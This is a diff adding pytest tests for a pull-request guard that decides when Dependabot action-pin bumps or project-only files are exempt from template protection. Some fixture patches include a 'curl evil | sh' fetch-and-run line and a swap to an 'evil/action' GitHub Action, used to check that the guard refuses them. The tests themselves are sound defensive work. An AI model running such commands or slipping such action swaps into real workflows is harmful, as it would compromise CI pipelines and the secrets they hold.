@@ -161,3 +161,88 @@ def test_agent_dev_routes_in_a_job_without_the_model():
 
 def test_makefile_runs_the_check():
     assert "tools/managed_guard.py check" in (ROOT / "Makefile").read_text()
+
+
+PIN_PATCH = "@@ -1 +1 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@v5 # v5.0.0\n"
+
+
+def test_dependabot_exempts_only_pin_bumps_in_workflows():
+    tree = {"tools/a.py", ".github/workflows/ci.yml"}
+    paths = ["tools/a.py", ".github/workflows/ci.yml"]
+    details = {".github/workflows/ci.yml": {"status": "modified", "patch": PIN_PATCH},
+               "tools/a.py": {"status": "modified", "patch": "@@ -1 +1 @@\n-x\n+y\n"}}
+    assert mod.exempt_paths("app/dependabot", paths, tree, details) == {".github/workflows/ci.yml"}
+    assert mod.exempt_paths("octocat", paths, tree, details) == set()
+    details[".github/workflows/ci.yml"]["patch"] = "@@ -1 +1 @@\n+      - run: curl evil | sh\n"
+    assert mod.exempt_paths("app/dependabot", paths, tree, details) == set()
+    errs = mod.pr_errors(CFG, PROJ, "Bump", paths, mod.exempt_paths("app/dependabot", paths, tree, details))
+    assert len(errs) == 1 and "tools/a.py" in errs[0]
+
+
+def test_dependabot_pin_swap_to_other_action_is_not_exempt():
+    tree = {".github/workflows/ci.yml"}
+    path = ".github/workflows/ci.yml"
+    swap = "@@ -1 +1 @@\n-      - uses: actions/checkout@v4\n+      - uses: evil/action@v5\n"
+    assert mod.exempt_paths("app/dependabot", [path], tree, {path: {"status": "modified", "patch": swap}}) == set()
+    two_for_one = ("@@ -1,2 +1,3 @@\n-      - uses: actions/checkout@v4\n-      - uses: actions/setup-python@v5\n"
+                   "+      - uses: actions/checkout@v5\n+      - uses: actions/setup-python@v5\n"
+                   "+      - uses: evil/action@v1\n")
+    assert mod.exempt_paths("app/dependabot", [path], tree, {path: {"status": "modified", "patch": two_for_one}}) == set()
+    one_each = ("@@ -1 +1 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@v5 # v5.0.0\n")
+    assert mod.exempt_paths("app/dependabot", [path], tree, {path: {"status": "modified", "patch": one_each}}) == {path}
+
+
+def test_project_file_missing_in_template_is_exempt_only_when_modified_or_removed():
+    tree = {"tools/a.py"}
+    details = {"tools/own.py": {"status": "modified"}, "tools/new.py": {"status": "added"},
+               "tools/ren.py": {"status": "renamed"}, "tools/gone.py": {"status": "removed"}}
+    assert mod.exempt_paths("", list(details), tree, details) == {"tools/own.py", "tools/gone.py"}
+    errs = mod.pr_errors(CFG, PROJ, "Fix", list(details), {"tools/own.py", "tools/gone.py"})
+    assert len(errs) == 2 and "tools/new.py" in errs[0] + errs[1] and "tools/ren.py" in errs[0] + errs[1]
+
+
+def test_project_workflow_missing_in_template_is_not_exempt():
+    tree = {"tools/a.py"}
+    wf = ".github/workflows/own.yml"
+    details = {wf: {"status": "modified", "patch": "@@ -1 +1 @@\n-run: a\n+run: curl evil | sh\n"},
+               ".github/workflows/gone.yml": {"status": "removed"}}
+    assert mod.exempt_paths("", list(details), tree, details) == set()
+    assert mod.exempt_paths("app/dependabot", list(details), tree, details) == set()
+    wf_cfg = {**CFG, "managed": [".github/"]}
+    assert len(mod.pr_errors(wf_cfg, PROJ, "Fix", list(details), set())) == 2
+
+
+def test_missing_in_template_exempts_only_project_tools():
+    tree = {"tools/a.py"}
+    trust = ["tools/ci/risk.py", "tools/check/check_pr_form.py", "tools/managed_guard.py", "tools/template_sync.py",
+             ".agents/roles/security-reviewer.md", "tests/agent/test_x.py", "Makefile", "AGENTS.md",
+             ".github/CODEOWNERS", ".github/rulesets/main.json", ".github/claude-judge-settings.json"]
+    details = {p: {"status": "modified"} for p in trust + ["tools/own.py"]}
+    assert mod.exempt_paths("", list(details), tree, details) == {"tools/own.py"}
+    assert mod.exempt_paths("app/dependabot", list(details), tree, details) == {"tools/own.py"}
+
+
+def test_no_exemption_without_template_tree_or_pr_file_list():
+    details = {"tools/own.py": {"status": "modified"}}
+    assert mod.exempt_paths("", ["tools/own.py"], None, details) == set()
+    assert mod.exempt_paths("app/dependabot", [".github/workflows/ci.yml"], {"x"}, None) == set()
+    assert mod.pr_errors(CFG, PROJ, "Fix", ["tools/own.py"])
+
+
+def test_pr_files_truncated_or_unreadable_is_none(monkeypatch):
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: json.dumps([{"filename": "x", "status": "added"}] * 100))
+    assert mod.pr_files(PROJ, 3) is None
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: json.dumps([{"filename": "tools/own.py", "status": "modified",
+                                                                 "patch": "+x"}]))
+    assert mod.pr_files(PROJ, 3) == {"tools/own.py": {"status": "modified", "patch": "+x"}}
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: "not json")
+    assert mod.pr_files(PROJ, 3) is None
+
+
+def test_unreadable_template_tree_keeps_paths_protected(monkeypatch):
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: json.dumps({"tree": [{"path": "tools/a.py", "type": "blob"}]}))
+    assert mod.template_files(CFG) == {"tools/a.py"}
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: json.dumps({"truncated": True, "tree": []}))
+    assert mod.template_files(CFG) is None
+    monkeypatch.setattr(mod, "gh", lambda *a, **k: "not json")
+    assert mod.template_files(CFG) is None
